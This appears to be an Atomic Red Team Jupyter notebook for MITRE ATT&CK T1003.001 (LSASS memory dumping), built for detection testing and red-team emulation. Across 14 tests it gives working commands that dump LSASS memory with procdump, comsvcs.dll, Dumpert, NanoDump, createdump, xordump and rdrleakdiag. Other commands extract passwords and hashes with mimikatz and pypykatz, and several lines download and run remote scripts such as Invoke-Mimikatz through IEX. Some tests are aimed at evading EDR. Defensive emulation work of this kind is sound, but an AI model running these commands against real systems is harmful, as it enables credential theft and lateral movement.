{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "de2eeb6d",
   "metadata": {},
   "source": "# T1003.001 - LSASS Memory\nAdversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as comsvcs.dll can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n"
  },
  {
   "cell_type": "markdown",
   "id": "991be118",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "22566fb3",
   "metadata": {},
   "source": "### Atomic Test #1 - Dump LSASS.exe Memory using ProcDump\nThe memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Procdump.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\" -Force\nNew-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\\Procdump.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\" -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1d5b84dd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "7945cae2",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3dc10608",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "1c482a39",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel \"C:\\Windows\\Temp\\lsass_dump.dmp\" >nul 2> nul\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "835d88fd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b63c7a7d",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Dump LSASS.exe Memory using comsvcs.dll",
    "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-comsvcs.dmp.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nC:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ede117f1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "fab4251a",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item $env:TEMP\\lsass-comsvcs.dmp -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b6dbefb1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "7a242dab",
   "metadata": {},
   "source": "### Atomic Test #3 - Dump LSASS.exe Memory using direct system calls and API unhooking\nThe memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find the path specified.\\\", try using the  get-prereq_commands to download the  tool first.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Dumpert executable must exist on disk at specified location (#{dumpert_exe})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Outflank-Dumpert.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Outflank-Dumpert.exe\") -Force | Out-Null\nInvoke-WebRequest \"https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Outflank-Dumpert.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "46d088db",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "dbd0ca1a",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\Outflank-Dumpert.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d36d9d3d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "736a3951",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel C:\\windows\\temp\\dumpert.dmp >nul 2> nul\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0fdacc3a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a1fa629c",
   "metadata": {},
   "source": "### Atomic Test #4 - Dump LSASS.exe Memory using NanoDump\nThe NanoDump tool uses syscalls and an invalid dump signature to avoid detection.\n\nhttps://github.com/helpsystems/nanodump\n\nUpon successful execution, you should find the nanondump.dmp file in the temp directory\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe)\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/fortra/nanodump/blob/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe\" \n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "92852439",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "884db0fd",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nPathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe -w \"%temp%\\nanodump.dmp\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "88a50322",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "e6f5c1cd",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel \"%temp%\\nanodump.dmp\" >nul 2> nul\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9e4164b8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "23575740",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Dump LSASS.exe Memory using Windows Task Manager",
    "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task\nManager and administrative permissions.\n",
    "**Supported Platforms:** windows",
    "Run it with these steps!",
    "1. Open Task Manager:\n  On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking\n  on the task bar and selecting \"Task Manager\".\n\n2. Select lsass.exe:\n  If lsass.exe is not visible, select \"Show processes from all users\". This will allow you to observe execution of lsass.exe\n  and select it for manipulation.\n\n3. Dump lsass.exe memory:\n  Right-click on lsass.exe in Task Manager. Select \"Create Dump File\". The following dialog will show you the path to the saved file.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "66c98b16",
   "metadata": {},
   "source": "### Atomic Test #6 - Offline Credential Theft With Mimikatz\nThe memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n\n```\n##### Description: Lsass dump must exist at specified location (#{input_file})\n\n##### Check Prereq Commands:\n```cmd\ncmd /c \"if not exist %tmp%\\lsass.DMP (exit /b 1)\"\n\n```\n##### Get Prereq Commands:\n```cmd\nWrite-Host \"Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c12614d6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "5d932d2d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe\" \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f6cbe6d6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "aa93a76c",
   "metadata": {},
   "source": "### Atomic Test #7 - LSASS read with pypykatz\nParses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple usernames and passwords/hashes to the screen.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `command_prompt`!\n##### Description: Computer must have python 3 installed\n\n##### Check Prereq Commands:\n```cmd\npy -3 --version >nul 2>&1\nexit /b %errorlevel%\n\n```\n##### Get Prereq Commands:\n```cmd\necho \"Python 3 must be installed manually\"\n\n```\n##### Description: Computer must have pip installed\n\n##### Check Prereq Commands:\n```cmd\npy -3 -m pip --version >nul 2>&1\nexit /b %errorlevel%\n\n```\n##### Get Prereq Commands:\n```cmd\necho \"PIP must be installed manually\"\n\n```\n##### Description: pypykatz must be installed and part of PATH\n\n##### Check Prereq Commands:\n```cmd\npypykatz -h >nul 2>&1\nexit /b %errorlevel%\n\n```\n##### Get Prereq Commands:\n```cmd\npip install pypykatz\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "008d793c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "7c6829fa",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\npypykatz live lsa\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c5d0aa83",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "cee9b8da",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Dump LSASS.exe Memory using Out-Minidump.ps1",
    "The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure\npowershell implementation that leverages the MiniDumpWriteDump Win32 API call.\nUpon successful execution, you should see the following file created $env:TEMP\\lsass_*.dmp.\n\nAuthor of Out-Minidump: Matthew Graeber (@mattifestation)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ntry{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}\ncatch{ $_; exit $_.Exception.Response.StatusCode.Value__}\nget-process lsass | Out-Minidump\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e6b2f44e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "a5f4f4c3",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item $env:TEMP\\lsass_*.dmp -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d128386d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "bf280a84",
   "metadata": {},
   "source": "### Atomic Test #9 - Create Mini Dump of LSASS.exe using ProcDump\nThe memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump. This particular method uses -mm to produce a mini dump of lsass.exe\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Procdump.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\" -Force\nNew-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\\Procdump.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\" -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "52427b92",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 9 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "d7fe84a4",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\" -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "44d395b9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "cd336c2d",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel \"C:\\Windows\\Temp\\lsass_dump.dmp\" >nul 2> nul\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d05ab02a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "1dbec268",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Powershell Mimikatz",
    "Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\nCommon failures include seeing an \\\"access denied\\\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a7aa5d08",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "e4cf15e9",
   "metadata": {},
   "source": "### Atomic Test #11 - Dump LSASS with createdump.exe from .Net v5\nUse createdump executable from .NET to create an LSASS dump.\n\n[Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: .Net v5 must be installed\n\n##### Check Prereq Commands:\n```powershell\n$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\nif ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nwinget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "069dafad",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 11 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "4cfe6780",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\n& \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cb034133",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "23dd94ab",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item $env:Temp\\dotnet-lsass.dmp -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "294ee526",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 11 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "94e2bbe9",
   "metadata": {},
   "source": "### Atomic Test #12 - Dump LSASS.exe using imported Microsoft DLLs\nThe memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by\nimporting built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump \nfile and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Computer must have xordump.exe\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path 'C:\\Windows\\Temp\\xordump.exe') {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\" -OutFile C:\\Windows\\Temp\\xordump.exe\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "98efbd9f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 12 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "8a54c60a",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nC:\\Windows\\Temp\\xordump.exe -out C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -x 0x41\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "db14266b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "42caddf0",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4b3e856c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 12 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "be7d106e",
   "metadata": {},
   "source": [
    "### Atomic Test #13 - Dump LSASS.exe using lolbin rdrleakdiag.exe",
    "The memory of lsass.exe is often dumped for offline credential theft attacks. \nThis can be achieved with lolbin rdrleakdiag.exe. \n\nUpon successful execution, you should see the following files created, $env:TEMP\\minidump_<PID>.dmp and  $env:TEMP\\results_<PID>.hlk.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nif (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\n  } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\n  } else {\n      $binary_path = \"File not found\"\n      exit 1\n  }\n$lsass_pid = get-process lsass |select -expand id\nif (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} \nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\n& $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "32382b2d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "63a4c98b",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item $env:TEMP\\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8ac4be17",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 13 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "49b47daf",
   "metadata": {},
   "source": "### Atomic Test #14 - Dump LSASS.exe Memory through Silent Process Exit\nWerFault.exe (Windows Error Reporting process that handles process crashes) can be abused to create a \nmemory dump of lsass.exe, in a directory of your choice. This method relies on a mechanism \nintroduced in Windows 7 called Silent Process Exit, which provides the ability to trigger\nspecific actions for a monitored process in one of two scenarios; either the process terminates\nitself by calling ExitProcess(), or another process terminates it via the TerminateProcess() API. \nThe major advantage of this technique is that it does not cause lsass.exe to crash, and since \nWerFault.exe is used to create file dumps all the time (not just lsass.exe), this method provides \nthe added advantage of going undetected. WerFault.exe is a process known for dumping every crashing process, \nfrom an attacker standpoint this is appealing as their illicit credential extraction will \nappear benign because from a defender\u2019s viewpoint it\u2019s within the realm of normal activity.\n\nUpon successful execution, you should find the dump file in directory of your choice or \"%temp%\\SilentProcessExit\" by default.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe)\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/fortra/nanodump/blob/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "78970960",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.001 -TestNumbers 14 -GetPreReqs"
